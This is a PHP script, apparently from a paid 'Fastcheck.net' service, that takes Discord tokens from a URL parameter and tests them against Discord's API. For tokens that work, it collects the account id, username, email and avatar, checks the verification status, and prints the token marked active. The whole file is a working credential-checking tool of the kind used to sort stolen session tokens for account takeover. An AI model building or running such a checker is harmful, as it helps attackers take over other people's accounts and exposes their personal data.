<?php

include_once '../includes/baglan.php';
session_start();
if(isset($_SESSION['uid']) && isset($_SESSION['username'])){
$username=$_SESSION['username'];
$sql = "SELECT * FROM users WHERE username = ?";
$stmt = $con->prepare($sql) or die ($con->error);
$stmt->bind_param('s',$username);
$stmt->execute();
$result_username = $stmt->get_result();
$row = $result_username->fetch_assoc();
if($row['pre']<1){

header("Location:/404.html");

}}else{

  header("Location:/auth/auth-login");
}
$token = $_GET['lista'];

$url = 'https://discord.com/api/v8/users/@me';
$proxy = '95.170.156.220:808';
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
    "Authorization: $token"
));
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
$curl_scraped_page = curl_exec($ch);
$fim = json_decode($curl_scraped_page, true);
$info = curl_getinfo($ch);
if ($info["http_code"] === 200) {
    $id = $fim['id'];
    $username = $fim['username'];
    $email = $fim['email'];
    $avatar = $fim['avatar'];
    $avatarurl = "https://cdn.discordapp.com/avatars/$id/$avatar.png?size=100";
    $urll = 'https://discord.com/api/v9/channels/@me';
    $curl = curl_init();
    curl_setopt($curl, CURLOPT_URL, $urll);
    curl_setopt($curl, CURLOPT_HTTPHEADER, array(
        "Authorization: $token"
    ));
    curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
    $curl_scraped = curl_exec($curl);
    $urlll = "https://www.shorturl.at/shortener.php";
    $short = curl_init();
    curl_setopt($short, CURLOPT_URL, $urlll);
    curl_setopt($short, CURLOPT_POST, 1);
    curl_setopt($short, CURLOPT_POSTFIELDS,
                "u=$avatarurl");
    curl_setopt($short, CURLOPT_RETURNTRANSFER, 1);
    $curl_page = curl_exec($short);
    function Capture($str, $starting_word, $ending_word){
        $subtring_start  = strpos($str, $starting_word);
        $subtring_start += strlen($starting_word);
        $size            = strpos($str, $ending_word, $subtring_start) - $subtring_start;
        return substr($str, $subtring_start, $size);
    };
    $short_url = Capture($curl_page, 'nput id="shortenurl" type="text" value="','"');
    curl_close($short);
    $error = '{"message": "You need to verify your account in order to perform this action.", "code": 40002}';
    if($curl_scraped == $error)
    {
    echo "✅ <b>#Aktif</b> - $token - Hesap-Durum: 2Factor - Id: $id - Username: $username - Email: $email Avatar-url: $short_url - <b>www.Fastcheck.net</b> <br>";
    }
    else{
    curl_close($curl);
    echo "✅ <b>#Aktif</b> - $token - Hesap-Durum: Active - Id: $id - Username: $username - Email: $email Avatar-url: $short_url - <b>www.Fastcheck.net</b> <br>";
    }
    } 
else {
    echo "DİSCORD TOKEN | ❌ #Kapalı - $token - <b>www.Fastcheck.net</b> <br>";
}
curl_close($ch);
?>